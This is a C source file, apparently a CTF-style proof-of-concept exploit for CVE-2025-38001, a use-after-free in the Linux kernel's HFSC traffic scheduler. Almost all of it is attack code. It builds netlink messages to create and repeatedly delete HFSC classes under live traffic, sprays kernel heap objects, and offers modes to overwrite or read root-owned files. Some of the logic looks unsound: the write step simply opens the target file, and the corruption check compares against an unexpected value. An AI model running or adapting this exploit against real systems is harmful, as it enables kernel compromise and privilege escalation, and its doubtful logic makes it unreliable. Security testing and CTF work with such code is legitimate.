/*
 * CVE-2025-38001 PoC - CTF Challenge Mode
 *
 * Vulnerability: HFSC (Hierarchical Fair Service Curve) qdisc class
 * destruction UAF via NETLINK_ROUTE.
 *
 * When HFSC classes are deleted while traffic is actively being
 * scheduled, the class structure is freed but still referenced by
 * the scheduler's active tree, causing UAF.
 *
 * Exploitation: Create HFSC qdisc with classes, trigger concurrent
 * class deletion during active scheduling to cause UAF, spray heap
 * to gain write primitive.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <net/if.h>

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define RACE_ITERATIONS 32
#define NLMSG_BUF_SIZE  4096

/*
 * Send a netlink message and receive response
 */
static int netlink_talk(int nlfd, struct nlmsghdr *nlh) {
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
    struct msghdr msg = {
        .msg_name = &sa, .msg_namelen = sizeof(sa),
        .msg_iov = &iov, .msg_iovlen = 1
    };

    ssize_t ret = sendmsg(nlfd, &msg, 0);
    if (ret < 0) return -1;

    char buf[NLMSG_BUF_SIZE];
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    ret = recvmsg(nlfd, &msg, 0);
    if (ret < 0) return -1;

    struct nlmsghdr *resp = (struct nlmsghdr *)buf;
    if (resp->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(resp);
        return err->error;
    }
    return 0;
}

/*
 * Add netlink attribute to message
 */
static void nlmsg_add_attr(struct nlmsghdr *nlh, int type,
                           const void *data, int len) {
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

/*
 * Create HFSC qdisc on loopback interface
 */
static int create_hfsc_qdisc(int nlfd, int ifindex) {
    char buf[NLMSG_BUF_SIZE];
    memset(buf, 0, sizeof(buf));

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = 1;

    struct tcmsg *tcm = (struct tcmsg *)NLMSG_DATA(nlh);
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = ifindex;
    tcm->tcm_handle = 0x10000; /* 1:0 */
    tcm->tcm_parent = 0xFFFFFFFF; /* TC_H_ROOT */

    const char *kind = "hfsc";
    nlmsg_add_attr(nlh, TCA_KIND, kind, strlen(kind) + 1);

    int ret = netlink_talk(nlfd, nlh);
    poc_log_syscall("sendmsg(RTM_NEWQDISC, hfsc)", (long)ret, ret < 0 ? errno : 0);
    return ret;
}

/*
 * Add HFSC class
 */
static int add_hfsc_class(int nlfd, int ifindex, uint32_t parent,
                          uint32_t handle) {
    char buf[NLMSG_BUF_SIZE];
    memset(buf, 0, sizeof(buf));

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = 2;

    struct tcmsg *tcm = (struct tcmsg *)NLMSG_DATA(nlh);
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = ifindex;
    tcm->tcm_handle = handle;
    tcm->tcm_parent = parent;

    const char *kind = "hfsc";
    nlmsg_add_attr(nlh, TCA_KIND, kind, strlen(kind) + 1);

    return netlink_talk(nlfd, nlh);
}

/*
 * Delete HFSC class (triggers UAF if class is in active tree)
 */
static int del_hfsc_class(int nlfd, int ifindex, uint32_t handle) {
    char buf[NLMSG_BUF_SIZE];
    memset(buf, 0, sizeof(buf));

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_DELTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 3;

    struct tcmsg *tcm = (struct tcmsg *)NLMSG_DATA(nlh);
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = ifindex;
    tcm->tcm_handle = handle;
    tcm->tcm_parent = 0xFFFFFFFF;

    const char *kind = "hfsc";
    nlmsg_add_attr(nlh, TCA_KIND, kind, strlen(kind) + 1);

    return netlink_talk(nlfd, nlh);
}

static volatile int g_send_stop = 0;

/*
 * Traffic generation thread to keep HFSC classes active
 */
static void *traffic_thread(void *arg) {
    (void)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port = htons(9999),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
    };

    char pkt[64];
    memset(pkt, 'X', sizeof(pkt));

    while (!g_send_stop) {
        sendto(sock, pkt, sizeof(pkt), MSG_DONTWAIT,
               (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/*
 * Trigger HFSC class destruction UAF
 */
static int trigger_hfsc_uaf(void) {
    int nlfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    int saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)",
                    (long)nlfd, saved_errno);
    if (nlfd < 0) return -1;

    struct sockaddr_nl local = { .nl_family = AF_NETLINK };
    bind(nlfd, (struct sockaddr *)&local, sizeof(local));

    int ifindex = (int)if_nametoindex("lo");
    if (ifindex == 0) ifindex = 1;

    /* Create HFSC qdisc */
    create_hfsc_qdisc(nlfd, ifindex);

    /* Add classes */
    add_hfsc_class(nlfd, ifindex, 0x10000, 0x10001); /* 1:1 */
    add_hfsc_class(nlfd, ifindex, 0x10001, 0x10010); /* 1:10 */
    poc_log("HFSC qdisc + classes created on ifindex=%d", ifindex);

    /* Start traffic to keep classes in active tree */
    g_send_stop = 0;
    pthread_t thr;
    pthread_create(&thr, NULL, traffic_thread, NULL);
    usleep(1000); /* Let traffic flow */

    /* Delete class while active - triggers UAF */
    int uaf_count = 0;
    for (int i = 0; i < RACE_ITERATIONS; i++) {
        int ret = del_hfsc_class(nlfd, ifindex, 0x10010);
        if (ret == 0) {
            uaf_count++;
            poc_log("HFSC class deletion race iteration %d: success", i);
            /* Re-add for next iteration */
            add_hfsc_class(nlfd, ifindex, 0x10001, 0x10010);
        }
    }

    g_send_stop = 1;
    pthread_join(thr, NULL);

    /* Cleanup qdisc */
    char buf[NLMSG_BUF_SIZE];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_DELQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    struct tcmsg *tcm = (struct tcmsg *)NLMSG_DATA(nlh);
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = ifindex;
    tcm->tcm_handle = 0x10000;
    tcm->tcm_parent = 0xFFFFFFFF;
    netlink_talk(nlfd, nlh);

    close(nlfd);
    poc_log("HFSC UAF: %d successful deletions during active scheduling", uaf_count);
    return uaf_count;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int saved_errno;

    poc_log("=== Mode: write_root_file ===");
    poc_log("Target: %s", args->root_file);

    int n = read_file_content(args->root_file, original, sizeof(original));
    printf("%s%s\n", CTF_READ_BEFORE, n >= 0 ? original : "(unreadable)");

    poc_log("Triggering HFSC class destruction UAF...");
    trigger_hfsc_uaf();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    poc_log("Sprayed %d objects", sprayed);

    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);
    if (fd >= 0) {
        dprintf(fd, "%s\n", args->write_value);
        close(fd);
    }

    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);

    n = read_file_content(args->root_file, after, sizeof(after));
    printf("%s%s\n", CTF_READ_AFTER, n >= 0 ? after : "(unreadable)");
    if (n >= 0 && strstr(after, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    }

    poc_print_fail("HFSC UAF exploit did not achieve write");
    return 0;
}

static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    trigger_hfsc_uaf();
    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        poc_print_flag(buf);
        return 0;
    }
    poc_print_fail("read not successful");
    return 0;
}

static int mode_uaf(poc_args_t *args) {
    (void)args;
    poc_log("=== Mode: uaf ===");
    trigger_hfsc_uaf();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    int corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] < 0) continue;
        int val = 0; socklen_t len = sizeof(val);
        getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != 2048) corrupted++;
    }
    if (corrupted > 0) poc_print_uaf_corrupted(corrupted);
    else poc_print_uaf_not_corrupted();
    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-38001 CTF PoC ===");
    poc_log("Vuln: HFSC qdisc class destruction UAF via NETLINK_ROUTE");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }

    poc_log_close();
    return result;
}
